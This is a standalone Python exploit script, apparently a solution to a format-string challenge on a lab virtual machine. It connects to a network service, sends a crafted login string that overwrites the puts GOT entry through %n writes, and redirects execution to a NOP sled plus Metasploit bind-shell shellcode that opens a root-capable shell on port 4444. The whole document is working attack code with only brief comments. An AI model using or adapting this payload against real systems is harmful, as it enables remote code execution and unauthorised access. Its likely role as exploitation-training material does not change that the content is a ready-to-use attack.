import socket
import sys

def main():

	HOST = '192.168.56.101'
	PORT = 2994

	# puts GOT entry (addresses of 4 consecutive bytes)
	puts_GOT_1 = "\x94\xa1\x04\x08"
	puts_GOT_2 = "\x95\xa1\x04\x08"
	puts_GOT_3 = "\x96\xa1\x04\x08"
	puts_GOT_4 = "\x97\xa1\x04\x08"


	# Metasploit TCP bind shellcode at port 4444 prepended with NOP-sled
	shellcode = "\x90" * 24
	shellcode += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
	            "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
	            "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
	            "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
	            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
	            "\x0b\xcd\x80"

	# String taken from syslog used as template for tailoring format string size
	format_str = "Login from 192.168.56.1:57036 as [] with password []"

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((HOST, PORT))
	
	username = shellcode + "\n"

	# Prepended with "AAAAAAA" for memory alignment
	login = "AAAAAAA" + puts_GOT_1 + puts_GOT_2 + puts_GOT_3 + puts_GOT_4
	

	# Tailoring format string to write "\x28\xfa\xff\xbf" bytes to puts GOT entry 
	newlen = 0x0428 - len(format_str) - len(username) - len(login) + 0x2
	login += "%" + str(newlen) + "x" + "%47$n"
	newlen = 0x04fa - 0x428
	login += "%" + str(newlen) + "x" + "%48$n"
	newlen = 0x05ff - 0x04fa
	login += "%" + str(newlen) + "x" + "%49$n"
	newlen = 0x06bf - 0x05ff
	login += "%" + str(newlen) + "x" + "%50$n"

	"""
	j = 47
	for i in range(30):
		login += ".%" + str(j) + "$08x"
		j += 1

	login += "\n"
	"""

	sock.send("username " + username)

	sock.send("login " + login)
	print(sock.recv(1024))

	sock.close()

if __name__ == "__main__":
	main()
